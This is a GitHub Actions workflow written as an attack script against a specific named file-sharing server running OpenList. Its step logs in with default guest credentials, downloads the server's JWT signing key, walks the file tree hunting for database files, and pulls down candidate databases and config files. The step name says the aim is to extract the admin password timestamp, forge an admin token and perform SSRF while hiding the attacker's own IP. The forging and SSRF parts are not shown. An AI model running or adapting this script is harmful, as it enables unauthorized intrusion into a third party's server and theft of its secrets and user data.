name: openlist-admin-ssrf
on:
  workflow_dispatch:
jobs:
  admin:
    runs-on: ubuntu-latest
    steps:
      - name: locate OpenList user DB + extract admin pwd_ts + forge + SSRF (zero own-IP)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          TOKEN=$(curl -skS -m20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))")
          echo "guest_token_len=${#TOKEN}"
          export TOKEN
          SUB=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['content'][0]['name'])")
          echo "SUB=[$SUB]"
          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))"; }
          dl () { curl -skS -m120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
          U=$(get_raw "/$SUB/jwt.key"); dl "$U" /tmp/jwt.key
          echo "jwt.key ascii=[$(cat /tmp/jwt.key)]  sha256=$(sha256sum /tmp/jwt.key|cut -c1-32)"
          echo "=== enumerate / ==="
          curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/"}' | python3 -c "import sys,json;c=json.load(sys.stdin)['data']['content'];[print(' ',x.get('name'),x.get('size'),x.get('type')) for x in c]"
          echo "=== enumerate /$SUB (pages) ==="
          python3 - "$SUB" <<'PY' 2>&1 | tee /tmp/find_db.out
          import sys,json,urllib.request,ssl
          SUB=sys.argv[1]; B="https://pan.yazinb.icu"; T=__import__('os').environ['TOKEN']
          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
          def listp(path,page):
              payload={"path":path,"page":page,"per_page":100}
              req=urllib.request.Request(B+"/api/fs/list",data=json.dumps(payload).encode(),headers={"Authorization":T,"Content-Type":"application/json"},method="POST")
              return json.loads(urllib.request.urlopen(req,context=ctx,timeout=30).read())
          def walk(path,depth=0):
              page=1
              while True:
                  d=listp(path,page); content=d.get('data',{}).get('content',[])
                  if not content: break
                  for x in content:
                      nm=x.get('name',''); tp=x.get('type'); sz=x.get('size')
                      prefix=("  "*depth + (path if path=="/" else path+"/") + nm)
                      print(prefix+" ["+str(tp)+"] sz="+str(sz))
                      if tp=='folder' and depth<3:
                          walk(path+"/"+nm, depth+1)
                      elif (nm.endswith('.db') or nm.endswith('.sqlite') or nm.endswith('.sqlite3')) and depth<4:
                          print("    *** DB CANDIDATE: "+path+"/"+nm)
                  if len(content)<100: break
                  page+=1
                  if page>50: break
          walk("/")
          PY
          echo "=== candidate direct probes ==="
          for cand in "data.db" "data/data.db" "sqlite.db" "openlist.db" "data/config.json" "config.json"; do
            echo "  try /$SUB/$cand"
            cj=$(curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB/$cand\"}")
            echo "    $cj" | head -c 160
            echo
            ru=$(echo "$cj" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))" 2>/dev/null)
            if [ -n "$ru" ]; then dl "$ru" "/tmp/$cand.db.raw" 2>/dev/null; fi
          done
          echo "=== DBs in /tmp ==="
          ls -la /tmp/*.db.raw /tmp/*.db 2>/dev/null
          echo "DONE_ENUM"
